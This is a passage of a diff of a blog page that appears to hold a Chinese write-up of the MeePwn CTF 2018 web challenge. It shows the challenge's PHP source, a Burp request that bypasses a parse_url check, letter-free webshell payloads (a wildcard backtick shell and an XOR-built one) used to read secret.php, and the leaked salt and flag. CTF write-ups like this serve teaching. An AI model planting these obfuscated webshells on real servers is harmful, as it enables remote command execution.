+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h1</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;shadow&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Are</span> <span style="color:#a6e22e">You</span> <span style="color:#a6e22e">Human</span><span style="color:#f92672">?&lt;/</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;</span> 
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main&#34;</span><span style="color:#f92672">&gt;</span> 
+    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button-success&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;human&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Yes&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Yes</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">button</span><span style="color:#f92672">&gt;</span> 
+    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button-error&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;human&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;No&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">No</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">button</span><span style="color:#f92672">&gt;</span> 
+<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">form</span><span style="color:#f92672">&gt;</span> 
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/taxi.png&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;taxi&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;15%&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;20%&#34;</span> <span style="color:#f92672">/&gt;</span> 
+<span style="color:#a6e22e">EOF</span>; 
+        <span style="color:#66d9ef">echo</span> $wrong; 
     } 
-    if(isset($_GET['human']) and !empty($_GET['human'])) 
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;human&#39;</span>]) <span style="color:#66d9ef">and</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_GET[<span style="color:#e6db74">&#39;human&#39;</span>])) 
     { 
-         if($_GET['human']==='Yes') 
+         <span style="color:#66d9ef">if</span>($_GET[<span style="color:#e6db74">&#39;human&#39;</span>]<span style="color:#f92672">===</span><span style="color:#e6db74">&#39;Yes&#39;</span>) 
         { 
-            $_SESSION['auth']=hash('sha256', 'human'.$salt); 
-            exit(header( &quot;Location: omega_sector.php&quot; )); 
+            $_SESSION[<span style="color:#e6db74">&#39;auth&#39;</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">hash</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#e6db74">&#39;human&#39;</span><span style="color:#f92672">.</span>$salt); 
+            <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">header</span>( <span style="color:#e6db74">&#34;Location: omega_sector.php&#34;</span> )); 
         } 
-        else 
+        <span style="color:#66d9ef">else</span> 
         { 
-            mapl_die(); 
+            <span style="color:#a6e22e">mapl_die</span>(); 
         } 
     } 
 } 
-else 
+<span style="color:#66d9ef">else</span> 
 { 
-    echo '&lt;h2 id=&quot;intro&quot; class=&quot;neon&quot;&gt;Seems like you are not belongs to this place, please comeback to ludibrium!&lt;/h2&gt;'; 
-    echo '&lt;img src=&quot;assets/map.jpg&quot; id=&quot;taxi&quot; width=&quot;55%&quot; height=&quot;55%&quot; /&gt;'; 
-    if(isset($_GET['is_debug']) and !empty($_GET['is_debug']) and $_GET['is_debug']===&quot;1&quot;) 
+    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;h2 id=&#34;intro&#34; class=&#34;neon&#34;&gt;Seems like you are not belongs to this place, please comeback to ludibrium!&lt;/h2&gt;&#39;</span>; 
+    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;img src=&#34;assets/map.jpg&#34; id=&#34;taxi&#34; width=&#34;55%&#34; height=&#34;55%&#34; /&gt;&#39;</span>; 
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;is_debug&#39;</span>]) <span style="color:#66d9ef">and</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_GET[<span style="color:#e6db74">&#39;is_debug&#39;</span>]) <span style="color:#66d9ef">and</span> $_GET[<span style="color:#e6db74">&#39;is_debug&#39;</span>]<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;1&#34;</span>) 
     { 
-        show_source(__FILE__); 
+        <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>); 
     } 
 } 
-?&gt; 
-&lt;body background=&quot;assets/background.jpg&quot; class=&quot;cenback&quot;&gt; 
-&lt;/body&gt; 
-&lt;!-- is_debug=1 --&gt; 
-&lt;!-- All images/medias credit goes to nexon, wizet --&gt; 
-&lt;/html&gt; 
-&lt;?php ob_end_flush(); ?&gt;
-</code></pre>
-
-<p>第一步需要绕过的是 <code>parse_url</code> 的校验，使得我们能够访问 omega_sector.php 和 alien_sector.php 两个页面</p>
-
+<span style="color:#75715e">?&gt;</span> 
+&lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">background</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/background.jpg&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cenback&#34;</span>&gt; 
+&lt;/<span style="color:#f92672">body</span>&gt; 
+<span style="color:#75715e">&lt;!-- is_debug=1 --&gt;</span> 
+<span style="color:#75715e">&lt;!-- All images/medias credit goes to nexon, wizet --&gt;</span> 
+&lt;/<span style="color:#f92672">html</span>&gt; 
+<span style="color:#75715e">&lt;?php</span> <span style="color:#a6e22e">ob_end_flush</span>(); <span style="color:#75715e">?&gt;</span>
+</code></pre></div><p>第一步需要绕过的是 <code>parse_url</code> 的校验，使得我们能够访问 omega_sector.php 和 alien_sector.php 两个页面</p>
 <p>这里存在的问题是 <code>$_SERVER['REQUEST_URI'];</code> 对应解析的是 <code>GET</code> 后面的字符串，而这其实是我们可以控制的，所以可以通过 burp 抓包的方式进行修改</p>
-
 <pre><code>GET http://alien.somewhere.meepwn.team?alien=%40!%23%24%40!%40%40 HTTP/1.1
 Host: 138.68.228.12
 Cache-Control: max-age=0
@@ -588,44 +519,28 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/a
 Accept-Language: zh-CN,zh;q=0.9
 Cookie: PHPSESSID=bihn4hd7oi3i59rjh7e5ejtat2
 Connection: close
-</code></pre>
-
-<p>进入这两个页面后，我们能够发现，alien_sector.php 仅限写入除数字字母外的字符，而 omega_sector.php 仅限写入数字和字母</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/MeePwn-CTF-2018-Web/alien_sector.png" alt="alien_sector" class="lazyload"><figcaption class="image-caption">alien_sector</figcaption></figure></p>
-
+</code></pre><p>进入这两个页面后，我们能够发现，alien_sector.php 仅限写入除数字字母外的字符，而 omega_sector.php 仅限写入数字和字母</p>
+<p><img src="/images/posts/MeePwn-CTF-2018-Web/alien_sector.png" alt="alien_sector"></p>
 <p>但由于我们的提交的文件名是任意可控的，所以依旧可以尝试构造无字母的 webshell，这里是 32C3 的 idea：</p>
-
-<pre><code class="language-php">&lt;?=`*`;
-</code></pre>
-
-<p>这里会将 <strong>``</strong> 内的内容当作 linux 上的命令来执行，具体可以参考：</p>
-
-<p><a href="https://wps2015.org/drops/drops/32C3%20CTF%20%E4%B8%A4%E4%B8%AAWeb%E9%A2%98%E7%9B%AE%E7%9A%84Writeup.html" rel="nofollow noreferrer" target="_blank">32C3 CTF两个Web题目的Writeup</a></p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span><span style="color:#e6db74">`*`</span>;
+</code></pre></div><p>这里会将 <strong>``</strong> 内的内容当作 linux 上的命令来执行，具体可以参考：</p>
+<p><a href="https://wps2015.org/drops/drops/32C3%20CTF%20%E4%B8%A4%E4%B8%AAWeb%E9%A2%98%E7%9B%AE%E7%9A%84Writeup.html">32C3 CTF两个Web题目的Writeup</a></p>
 <p>所以我们可以尝试构造 <code>/???/??? ../??????.???</code> 来尝试执行 <code>/bin/cat ../secret.php</code></p>
-
 <p>此时可以读到相应 secret.php 的源码：</p>
-
-<pre><code class="language-php">&lt;?php
-$salt='G0g0_M3s0sr4ng3rS_1337';
-$omega_sector_flag=&quot;MeePwnCTF{__133-221-333-123-111___}&quot;;
-//Don't attack further after captured our flag, or we will find you and we will kill you... oops, i mean ban you ^_^.
-function mapl_die(){
-    $wrong = &lt;&lt;&lt;EOF
-&lt;body background=&quot;assets/wrong.jpg&quot; class=&quot;cenback&quot;&gt;&lt;/body&gt;
-EOF;
-    die($wrong);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+$salt<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;G0g0_M3s0sr4ng3rS_1337&#39;</span>;
+$omega_sector_flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;MeePwnCTF{__133-221-333-123-111___}&#34;</span>;
+<span style="color:#75715e">//Don&#39;t attack further after captured our flag, or we will find you and we will kill you... oops, i mean ban you ^_^.
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">mapl_die</span>(){
+    $wrong <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;&lt;&lt;</span><span style="color:#e6db74">EOF</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">&lt;body background=&#34;assets/wrong.jpg&#34; class=&#34;cenback&#34;&gt;&lt;/body&gt;
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">EOF</span>;
+    <span style="color:#66d9ef">die</span>($wrong);
 }
-?&gt;
-</code></pre>
-
-<p>或者是通过字符串异或的方式拼接 webshell：</p>
-
-<pre><code class="language-php">&lt;?=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]); // &lt;?php $_GET[_]($_GET[__]);
-</code></pre>
-
-<p>当然这里还可以继续 32C3 的思路，使用控制文件名的方式来构造 webshell，但更为复杂，在此掠过不表。</p>
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div><p>或者是通过字符串异或的方式拼接 webshell：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span>$_<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;`{{{&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;?&lt;&gt;/&#34;</span>;${$_}[<span style="color:#a6e22e">_</span>](${$_}[<span style="color:#a6e22e">__</span>]); <span style="color:#75715e">// &lt;?php $_GET[_]($_GET[__]);
+</span></code></pre></div><p>当然这里还可以继续 32C3 的思路，使用控制文件名的方式来构造 webshell，但更为复杂，在此掠过不表。</p>
 
     </div>
 
